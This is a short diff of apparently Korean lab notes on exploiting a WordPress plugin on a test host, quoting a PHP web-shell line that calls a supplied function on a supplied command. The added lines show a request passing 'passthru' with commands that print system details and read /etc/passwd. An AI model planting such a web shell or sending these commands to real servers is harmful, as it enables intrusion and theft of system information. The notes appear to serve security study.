@@ -55,3 +55,5 @@ if (isset($s) && isset($y)) @die($x($y)); // 추출 결과가 x(함수) y(명령
 코드 변경사항 저장
 
 `http://vulnwp/wordpress/wp-content/plugins/`에 플러그인이 모두 저장되어 있다.
+![[Pasted image 20240930141315.png]]
+`x=passthru&y=pwd;uname -a cat /etc/issu; cat /etc/passwd;` 이어서 명령어를 입력할 수 있다.
